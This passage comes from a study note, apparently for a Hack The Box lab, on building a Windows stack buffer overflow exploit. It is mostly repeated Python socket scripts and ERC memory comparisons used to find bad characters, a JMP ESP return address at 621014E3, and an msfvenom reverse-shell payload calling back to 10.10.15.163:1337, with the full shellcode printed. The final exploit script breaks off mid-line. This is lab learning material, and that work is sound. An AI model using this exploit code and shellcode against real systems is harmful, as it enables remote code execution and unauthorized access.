	    0xD3, 0xD4, 0xD5, 0xD6, 0xD7, 0xD8, 0xD9, 0xDA,
	    0xDB, 0xDC, 0xDD, 0xDE, 0xDF, 0xE0, 0xE1, 0xE2,
	    0xE3, 0xE4, 0xE5, 0xE6, 0xE7, 0xE8, 0xE9, 0xEA,
	    0xEB, 0xEC, 0xED, 0xEE, 0xEF, 0xF0, 0xF1, 0xF2,
	    0xF3, 0xF4, 0xF5, 0xF6, 0xF7, 0xF8, 0xF9, 0xFA,
	    0xFB, 0xFC, 0xFD, 0xFE, 0xFF
    ])

    offset = 469
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip + all_chars

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

bad_chars()
```

Run and check agaaaain:

```powershell
ERC --compare 00EBFB48 C:\Users\htb-student\Desktop\ByteArray_4.bin

Comparing memory region starting at 0xEBFB48 to bytes in file C:\Users\htb-student\Desktop\ByteArray_4.bin  
                   ----------------------------------------------------  
        From Array | 01 02 03 04 05 06 07 08 0B 0C 0D 0E 0F 10 11 12  |   
From Memory Region | 01 02 03 04 05 06 07 08 0B 0C 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F 20 21 22  |   
From Memory Region | 00 00 00 00 00 00 00 00 60 1C 40 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 23 24 25 26 27 28 29 2A 2B 2C 2D 2E 2F 30 31 32  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 33 34 35 36 37 38 39 3A 3B 3C 3D 3E 3F 40 41 42  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 43 44 45 46 47 48 49 4A 4B 4C 4D 4E 4F 50 51 52  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 53 54 55 56 57 58 59 5A 5B 5C 5D 5E 5F 60 61 62  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 63 64 65 66 67 68 69 6A 6B 6C 6D 6E 6F 70 71 72  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 73 74 75 76 77 78 79 7A 7B 7C 7D 7E 7F 80 81 82  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 83 84 85 86 87 88 89 8A 8B 8C 8D 8E 8F 90 91 92  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 93 94 95 96 97 98 99 9A 9B 9C 9D 9E 9F A0 A1 A2  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | A3 A4 A5 A6 A7 A8 A9 AA AB AC AD AE AF B0 B1 B2  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | B3 B4 B5 B6 B7 B8 B9 BA BB BC BD BE BF C0 C1 C2  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | C3 C4 C5 C6 C7 C8 C9 CA CB CC CD CE CF D0 D1 D2  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | D3 D4 D5 D6 D7 D8 D9 DA DB DC DD DE DF E0 E1 E2  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | E3 E4 E5 E6 E7 E8 E9 EA EB EC ED EE EF F0 F1 F2  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
                   ----------------------------------------------------
```

Now we spot another bad chars `0C` so we remove it:

```
ERC --bytearray -bytes 0x00,0x09,0x0A,0x0C
```

We update exploit :

```python
def bad_chars():
    all_chars = bytes([
		0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
	    0x0B, 0x0D, 0x0E, 0x0F, 0x10, 0x11, 0x12, 0x13,
	    0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1A, 0x1B,
	    0x1C, 0x1D, 0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23,
	    0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2A, 0x2B,
	    0x2C, 0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x32, 0x33,
	    0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3A, 0x3B,
	    0x3C, 0x3D, 0x3E, 0x3F, 0x40, 0x41, 0x42, 0x43,
	    0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B,
	    0x4C, 0x4D, 0x4E, 0x4F, 0x50, 0x51, 0x52, 0x53,
	    0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A, 0x5B,
	    0x5C, 0x5D, 0x5E, 0x5F, 0x60, 0x61, 0x62, 0x63,
	    0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6A, 0x6B,
	    0x6C, 0x6D, 0x6E, 0x6F, 0x70, 0x71, 0x72, 0x73,
	    0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7A, 0x7B,
	    0x7C, 0x7D, 0x7E, 0x7F, 0x80, 0x81, 0x82, 0x83,
	    0x84, 0x85, 0x86, 0x87, 0x88, 0x89, 0x8A, 0x8B,
	    0x8C, 0x8D, 0x8E, 0x8F, 0x90, 0x91, 0x92, 0x93,
	    0x94, 0x95, 0x96, 0x97, 0x98, 0x99, 0x9A, 0x9B,
	    0x9C, 0x9D, 0x9E, 0x9F, 0xA0, 0xA1, 0xA2, 0xA3,
	    0xA4, 0xA5, 0xA6, 0xA7, 0xA8, 0xA9, 0xAA, 0xAB,
	    0xAC, 0xAD, 0xAE, 0xAF, 0xB0, 0xB1, 0xB2, 0xB3,
	    0xB4, 0xB5, 0xB6, 0xB7, 0xB8, 0xB9, 0xBA, 0xBB,
	    0xBC, 0xBD, 0xBE, 0xBF, 0xC0, 0xC1, 0xC2, 0xC3,
	    0xC4, 0xC5, 0xC6, 0xC7, 0xC8, 0xC9, 0xCA, 0xCB,
	    0xCC, 0xCD, 0xCE, 0xCF, 0xD0, 0xD1, 0xD2, 0xD3,
	    0xD4, 0xD5, 0xD6, 0xD7, 0xD8, 0xD9, 0xDA, 0xDB,
	    0xDC, 0xDD, 0xDE, 0xDF, 0xE0, 0xE1, 0xE2, 0xE3,
	    0xE4, 0xE5, 0xE6, 0xE7, 0xE8, 0xE9, 0xEA, 0xEB,
	    0xEC, 0xED, 0xEE, 0xEF, 0xF0, 0xF1, 0xF2, 0xF3,
	    0xF4, 0xF5, 0xF6, 0xF7, 0xF8, 0xF9, 0xFA, 0xFB,
	    0xFC, 0xFD, 0xFE, 0xFF
    ])

    offset = 469
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip + all_chars

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

bad_chars()
```

We run and compare again:

```powershell
ERC --compare 00DEFB48 C:\Users\htb-student\Desktop\ByteArray_5.bin

Comparing memory region starting at 0xDEFB48 to bytes in file C:\Users\htb-student\Desktop\ByteArray_5.bin  
                   ----------------------------------------------------  
        From Array | 01 02 03 04 05 06 07 08 0B 0D 0E 0F 10 11 12 13  |   
From Memory Region | 01 02 03 04 05 06 07 08 0B 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F 20 21 22 23  |   
From Memory Region | 00 00 00 00 00 00 00 00 60 1C 40 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 24 25 26 27 28 29 2A 2B 2C 2D 2E 2F 30 31 32 33  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 34 35 36 37 38 39 3A 3B 3C 3D 3E 3F 40 41 42 43  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 44 45 46 47 48 49 4A 4B 4C 4D 4E 4F 50 51 52 53  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 54 55 56 57 58 59 5A 5B 5C 5D 5E 5F 60 61 62 63  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 64 65 66 67 68 69 6A 6B 6C 6D 6E 6F 70 71 72 73  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 74 75 76 77 78 79 7A 7B 7C 7D 7E 7F 80 81 82 83  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 84 85 86 87 88 89 8A 8B 8C 8D 8E 8F 90 91 92 93  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 94 95 96 97 98 99 9A 9B 9C 9D 9E 9F A0 A1 A2 A3  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | A4 A5 A6 A7 A8 A9 AA AB AC AD AE AF B0 B1 B2 B3  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | B4 B5 B6 B7 B8 B9 BA BB BC BD BE BF C0 C1 C2 C3  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | C4 C5 C6 C7 C8 C9 CA CB CC CD CE CF D0 D1 D2 D3  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | D4 D5 D6 D7 D8 D9 DA DB DC DD DE DF E0 E1 E2 E3  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | E4 E5 E6 E7 E8 E9 EA EB EC ED EE EF F0 F1 F2 F3  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
                   ----------------------------------------------------
```

So `0B` is bad char too:

```powershell
ERC --bytearray -bytes 0x00,0x09,0x0A,0x0B,0x0C
```

Update exploit:

```python
def bad_chars():
    all_chars = bytes([
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
    0x0D, 0x0E, 0x0F, 0x10, 0x11, 0x12, 0x13, 0x14,
    0x15, 0x16, 0x17, 0x18, 0x19, 0x1A, 0x1B, 0x1C,
    0x1D, 0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23, 0x24,
    0x25, 0x26, 0x27, 0x28, 0x29, 0x2A, 0x2B, 0x2C,
    0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x32, 0x33, 0x34,
    0x35, 0x36, 0x37, 0x38, 0x39, 0x3A, 0x3B, 0x3C,
    0x3D, 0x3E, 0x3F, 0x40, 0x41, 0x42, 0x43, 0x44,
    0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C,
    0x4D, 0x4E, 0x4F, 0x50, 0x51, 0x52, 0x53, 0x54,
    0x55, 0x56, 0x57, 0x58, 0x59, 0x5A, 0x5B, 0x5C,
    0x5D, 0x5E, 0x5F, 0x60, 0x61, 0x62, 0x63, 0x64,
    0x65, 0x66, 0x67, 0x68, 0x69, 0x6A, 0x6B, 0x6C,
    0x6D, 0x6E, 0x6F, 0x70, 0x71, 0x72, 0x73, 0x74,
    0x75, 0x76, 0x77, 0x78, 0x79, 0x7A, 0x7B, 0x7C,
    0x7D, 0x7E, 0x7F, 0x80, 0x81, 0x82, 0x83, 0x84,
    0x85, 0x86, 0x87, 0x88, 0x89, 0x8A, 0x8B, 0x8C,
    0x8D, 0x8E, 0x8F, 0x90, 0x91, 0x92, 0x93, 0x94,
    0x95, 0x96, 0x97, 0x98, 0x99, 0x9A, 0x9B, 0x9C,
    0x9D, 0x9E, 0x9F, 0xA0, 0xA1, 0xA2, 0xA3, 0xA4,
    0xA5, 0xA6, 0xA7, 0xA8, 0xA9, 0xAA, 0xAB, 0xAC,
    0xAD, 0xAE, 0xAF, 0xB0, 0xB1, 0xB2, 0xB3, 0xB4,
    0xB5, 0xB6, 0xB7, 0xB8, 0xB9, 0xBA, 0xBB, 0xBC,
    0xBD, 0xBE, 0xBF, 0xC0, 0xC1, 0xC2, 0xC3, 0xC4,
    0xC5, 0xC6, 0xC7, 0xC8, 0xC9, 0xCA, 0xCB, 0xCC,
    0xCD, 0xCE, 0xCF, 0xD0, 0xD1, 0xD2, 0xD3, 0xD4,
    0xD5, 0xD6, 0xD7, 0xD8, 0xD9, 0xDA, 0xDB, 0xDC,
    0xDD, 0xDE, 0xDF, 0xE0, 0xE1, 0xE2, 0xE3, 0xE4,
    0xE5, 0xE6, 0xE7, 0xE8, 0xE9, 0xEA, 0xEB, 0xEC,
    0xED, 0xEE, 0xEF, 0xF0, 0xF1, 0xF2, 0xF3, 0xF4,
    0xF5, 0xF6, 0xF7, 0xF8, 0xF9, 0xFA, 0xFB, 0xFC,
    0xFD, 0xFE, 0xFF
    ])

    offset = 469
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip + all_chars

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

bad_chars()
```

Run and compare:

```powershell
ERC --compare 00EFFB48 C:\Users\htb-student\Desktop\ByteArray_6.bin

Comparing memory region starting at 0xEFFB48 to bytes in file C:\Users\htb-student\Desktop\ByteArray_6.bin  
                   ----------------------------------------------------  
        From Array | 01 02 03 04 05 06 07 08 0D 0E 0F 10 11 12 13 14  |   
From Memory Region | 01 02 03 04 05 06 07 08 00 05 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 15 16 17 18 19 1A 1B 1C 1D 1E 1F 20 21 22 23 24  |   
From Memory Region | 00 00 00 00 00 00 00 00 60 1C 40 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 25 26 27 28 29 2A 2B 2C 2D 2E 2F 30 31 32 33 34  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 35 36 37 38 39 3A 3B 3C 3D 3E 3F 40 41 42 43 44  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 45 46 47 48 49 4A 4B 4C 4D 4E 4F 50 51 52 53 54  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 55 56 57 58 59 5A 5B 5C 5D 5E 5F 60 61 62 63 64  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 65 66 67 68 69 6A 6B 6C 6D 6E 6F 70 71 72 73 74  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 75 76 77 78 79 7A 7B 7C 7D 7E 7F 80 81 82 83 84  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 85 86 87 88 89 8A 8B 8C 8D 8E 8F 90 91 92 93 94  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 95 96 97 98 99 9A 9B 9C 9D 9E 9F A0 A1 A2 A3 A4  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | A5 A6 A7 A8 A9 AA AB AC AD AE AF B0 B1 B2 B3 B4  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | B5 B6 B7 B8 B9 BA BB BC BD BE BF C0 C1 C2 C3 C4  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | C5 C6 C7 C8 C9 CA CB CC CD CE CF D0 D1 D2 D3 D4  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | D5 D6 D7 D8 D9 DA DB DC DD DE DF E0 E1 E2 E3 E4  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | E5 E6 E7 E8 E9 EA EB EC ED EE EF F0 F1 F2 F3 F4  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | F5 F6 F7 F8 F9 FA FB FC FD FE FF  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
                   ----------------------------------------------------
```

We have to remove `0D`, continuing with the algorithm:

```powershell
ERC --bytearray -bytes 0x00,0x09,0x0A,0x0B,0x0C,0x0D
```

Update exploit:

```python
def bad_chars():
    all_chars = bytes([
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
    0x0E, 0x0F, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15,
    0x16, 0x17, 0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D,
    0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25,
    0x26, 0x27, 0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D,
    0x2E, 0x2F, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35,
    0x36, 0x37, 0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D,
    0x3E, 0x3F, 0x40, 0x41, 0x42, 0x43, 0x44, 0x45,
    0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D,
    0x4E, 0x4F, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55,
    0x56, 0x57, 0x58, 0x59, 0x5A, 0x5B, 0x5C, 0x5D,
    0x5E, 0x5F, 0x60, 0x61, 0x62, 0x63, 0x64, 0x65,
    0x66, 0x67, 0x68, 0x69, 0x6A, 0x6B, 0x6C, 0x6D,
    0x6E, 0x6F, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75,
    0x76, 0x77, 0x78, 0x79, 0x7A, 0x7B, 0x7C, 0x7D,
    0x7E, 0x7F, 0x80, 0x81, 0x82, 0x83, 0x84, 0x85,
    0x86, 0x87, 0x88, 0x89, 0x8A, 0x8B, 0x8C, 0x8D,
    0x8E, 0x8F, 0x90, 0x91, 0x92, 0x93, 0x94, 0x95,
    0x96, 0x97, 0x98, 0x99, 0x9A, 0x9B, 0x9C, 0x9D,
    0x9E, 0x9F, 0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5,
    0xA6, 0xA7, 0xA8, 0xA9, 0xAA, 0xAB, 0xAC, 0xAD,
    0xAE, 0xAF, 0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5,
    0xB6, 0xB7, 0xB8, 0xB9, 0xBA, 0xBB, 0xBC, 0xBD,
    0xBE, 0xBF, 0xC0, 0xC1, 0xC2, 0xC3, 0xC4, 0xC5,
    0xC6, 0xC7, 0xC8, 0xC9, 0xCA, 0xCB, 0xCC, 0xCD,
    0xCE, 0xCF, 0xD0, 0xD1, 0xD2, 0xD3, 0xD4, 0xD5,
    0xD6, 0xD7, 0xD8, 0xD9, 0xDA, 0xDB, 0xDC, 0xDD,
    0xDE, 0xDF, 0xE0, 0xE1, 0xE2, 0xE3, 0xE4, 0xE5,
    0xE6, 0xE7, 0xE8, 0xE9, 0xEA, 0xEB, 0xEC, 0xED,
    0xEE, 0xEF, 0xF0, 0xF1, 0xF2, 0xF3, 0xF4, 0xF5,
    0xF6, 0xF7, 0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD,
    0xFE, 0xFF
    ])

    offset = 469
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip + all_chars

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

bad_chars()
```

Compare: 

```powershell
ERC --compare 00EBFB48 C:\Users\htb-student\Desktop\ByteArray_7.bin

Comparing memory region starting at 0xEBFB48 to bytes in file C:\Users\htb-student\Desktop\ByteArray_7.bin  
                   ----------------------------------------------------  
        From Array | 01 02 03 04 05 06 07 08 0E 0F 10 11 12 13 14 15  |   
From Memory Region | 01 02 03 04 05 06 07 08 0E 0F 10 11 12 13 14 15  |   
                   |                                                  |   
        From Array | 16 17 18 19 1A 1B 1C 1D 1E 1F 20 21 22 23 24 25  |   
From Memory Region | 16 17 18 19 1A 1B 1C 1D 1E 1F 20 21 22 23 24 25  |   
                   |                                                  |   
        From Array | 26 27 28 29 2A 2B 2C 2D 2E 2F 30 31 32 33 34 35  |   
From Memory Region | 26 27 28 29 2A 2B 2C 2D 2E 2F 30 31 32 33 34 35  |   
                   |                                                  |   
        From Array | 36 37 38 39 3A 3B 3C 3D 3E 3F 40 41 42 43 44 45  |   
From Memory Region | 36 37 38 39 3A 3B 3C 3D 3E 3F 40 41 42 43 44 45  |   
                   |                                                  |   
        From Array | 46 47 48 49 4A 4B 4C 4D 4E 4F 50 51 52 53 54 55  |   
From Memory Region | 46 47 48 49 4A 4B 4C 4D 4E 4F 50 51 52 53 54 55  |   
                   |                                                  |   
        From Array | 56 57 58 59 5A 5B 5C 5D 5E 5F 60 61 62 63 64 65  |   
From Memory Region | 56 57 58 59 5A 5B 5C 5D 5E 5F 60 61 62 63 64 65  |   
                   |                                                  |   
        From Array | 66 67 68 69 6A 6B 6C 6D 6E 6F 70 71 72 73 74 75  |   
From Memory Region | 66 67 68 69 6A 6B 6C 6D 6E 6F 70 71 72 73 74 75  |   
                   |                                                  |   
        From Array | 76 77 78 79 7A 7B 7C 7D 7E 7F 80 81 82 83 84 85  |   
From Memory Region | 76 77 78 79 7A 7B 7C 7D 7E 7F 80 81 82 83 84 85  |   
                   |                                                  |   
        From Array | 86 87 88 89 8A 8B 8C 8D 8E 8F 90 91 92 93 94 95  |   
From Memory Region | 86 87 88 89 8A 8B 8C 8D 8E 8F 90 91 92 93 94 95  |   
                   |                                                  |   
        From Array | 96 97 98 99 9A 9B 9C 9D 9E 9F A0 A1 A2 A3 A4 A5  |   
From Memory Region | 96 97 98 99 9A 9B 9C 9D 9E 9F A0 A1 A2 A3 A4 A5  |   
                   |                                                  |   
        From Array | A6 A7 A8 A9 AA AB AC AD AE AF B0 B1 B2 B3 B4 B5  |   
From Memory Region | A6 A7 A8 A9 AA AB AC AD AE AF B0 B1 B2 B3 B4 B5  |   
                   |                                                  |   
        From Array | B6 B7 B8 B9 BA BB BC BD BE BF C0 C1 C2 C3 C4 C5  |   
From Memory Region | B6 B7 B8 B9 BA BB BC BD BE BF C0 C1 C2 C3 C4 C5  |   
                   |                                                  |   
        From Array | C6 C7 C8 C9 CA CB CC CD CE CF D0 D1 D2 D3 D4 D5  |   
From Memory Region | C6 C7 C8 C9 CA CB CC CD CE CF D0 D1 D2 D3 D4 D5  |   
                   |                                                  |   
        From Array | D6 D7 D8 D9 DA DB DC DD DE DF E0 E1 E2 E3 E4 E5  |   
From Memory Region | D6 D7 D8 D9 DA DB DC DD DE DF E0 E1 E2 E3 E4 E5  |   
                   |                                                  |   
        From Array | E6 E7 E8 E9 EA EB EC ED EE EF F0 F1 F2 F3 F4 F5  |   
From Memory Region | E6 E7 E8 E9 EA EB EC ED EE EF F0 F1 F2 F3 F4 F5  |   
                   |                                                  |   
        From Array | F6 F7 F8 F9 FA FB FC FD FE FF  |   
From Memory Region | F6 F7 F8 F9 FA FB FC FD FE FF  |   
                   |                                                  |   
                   ----------------------------------------------------
```

As we can see we have successfully manually removed all bad characters now in `7 iterations`.

### Finding a Return Instruction

Now that we have control over `EIP` and know which bad characters to avoid in our payload, we need to find an instruction to execute the payload we will place on the stack.

We will prefer using an address of an instruction built within the program to ensure it will run on any system.

We can go to the `CPU` tab and right-click then select `Search For>All Modules>Command`, and enter the `JMP ESP`, and we will get a list of `JMP ESP` instructions in loaded modules:

![Pasted image 20251010182201.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251010182201.png)

![Pasted image 20251010182214.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251010182214.png)

We check the first one and it's usable in our exploit.

![Pasted image 20251010182504.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251010182504.png)

We can store it:

```bash
621014E3
```
### Jumping to Shellcode

Now we create the shellcode with `msfvenom` to gain a [Reverse Shell](../../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md) on the target use `-b` to specify any bad characters:

```bash
└─$ msfvenom -p 'windows/shell_reverse_tcp' LHOST=10.10.15.163 LPORT=1337 -f 'python' -b '\x00\x09\x0A\x0B\x0C\x0D' 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1745 bytes
buf =  b""
buf += b"\xb8\xe0\x58\x50\xdd\xd9\xc0\xd9\x74\x24\xf4\x5a"
buf += b"\x33\xc9\xb1\x52\x31\x42\x12\x03\x42\x12\x83\x22"
buf += b"\x5c\xb2\x28\x5e\xb5\xb0\xd3\x9e\x46\xd5\x5a\x7b"
buf += b"\x77\xd5\x39\x08\x28\xe5\x4a\x5c\xc5\x8e\x1f\x74"
buf += b"\x5e\xe2\xb7\x7b\xd7\x49\xee\xb2\xe8\xe2\xd2\xd5"
buf += b"\x6a\xf9\x06\x35\x52\x32\x5b\x34\x93\x2f\x96\x64"
buf += b"\x4c\x3b\x05\x98\xf9\x71\x96\x13\xb1\x94\x9e\xc0"
buf += b"\x02\x96\x8f\x57\x18\xc1\x0f\x56\xcd\x79\x06\x40"
buf += b"\x12\x47\xd0\xfb\xe0\x33\xe3\x2d\x39\xbb\x48\x10"
buf += b"\xf5\x4e\x90\x55\x32\xb1\xe7\xaf\x40\x4c\xf0\x74"
buf += b"\x3a\x8a\x75\x6e\x9c\x59\x2d\x4a\x1c\x8d\xa8\x19"
buf += b"\x12\x7a\xbe\x45\x37\x7d\x13\xfe\x43\xf6\x92\xd0"
buf += b"\xc5\x4c\xb1\xf4\x8e\x17\xd8\xad\x6a\xf9\xe5\xad"
buf += b"\xd4\xa6\x43\xa6\xf9\xb3\xf9\xe5\x95\x70\x30\x15"
buf += b"\x66\x1f\x43\x66\x54\x80\xff\xe0\xd4\x49\x26\xf7"
buf += b"\x1b\x60\x9e\x67\xe2\x8b\xdf\xae\x21\xdf\x8f\xd8"
buf += b"\x80\x60\x44\x18\x2c\xb5\xcb\x48\x82\x66\xac\x38"
buf += b"\x62\xd7\x44\x52\x6d\x08\x74\x5d\xa7\x21\x1f\xa4"
buf += b"\x20\x44\xea\xa9\x13\x30\xe8\xb5\x56\xf8\x65\x53"
buf += b"\x32\xea\x23\xcc\xab\x93\x69\x86\x4a\x5b\xa4\xe3"
buf += b"\x4d\xd7\x4b\x14\x03\x10\x21\x06\xf4\xd0\x7c\x74"
buf += b"\x53\xee\xaa\x10\x3f\x7d\x31\xe0\x36\x9e\xee\xb7"
buf += b"\x1f\x50\xe7\x5d\xb2\xcb\x51\x43\x4f\x8d\x9a\xc7"
buf += b"\x94\x6e\x24\xc6\x59\xca\x02\xd8\xa7\xd3\x0e\x8c"
buf += b"\x77\x82\xd8\x7a\x3e\x7c\xab\xd4\xe8\xd3\x65\xb0"
buf += b"\x6d\x18\xb6\xc6\x71\x75\x40\x26\xc3\x20\x15\x59"
buf += b"\xec\xa4\x91\x22\x10\x55\x5d\xf9\x90\x65\x14\xa3"
buf += b"\xb1\xed\xf1\x36\x80\x73\x02\xed\xc7\x8d\x81\x07"
buf += b"\xb8\x69\x99\x62\xbd\x36\x1d\x9f\xcf\x27\xc8\x9f"
buf += b"\x7c\x47\xd9"
```

We have to update our final exploit:

```python
#!/usr/bin/python3

import socket
from struct import pack

IP = input("Enter IP: ").str
port = 21449

def fuzz():
    try:
        for i in range(0,10000,500):
            buffer = b"A"*i
            print("Fuzzing %s bytes" % i)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((IP, port))
            s.send(buffer)
            breakpoint()
            s.close()
    except:
        print("Could not establish a connection")

def eip_offset():
    pattern = bytes("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac"
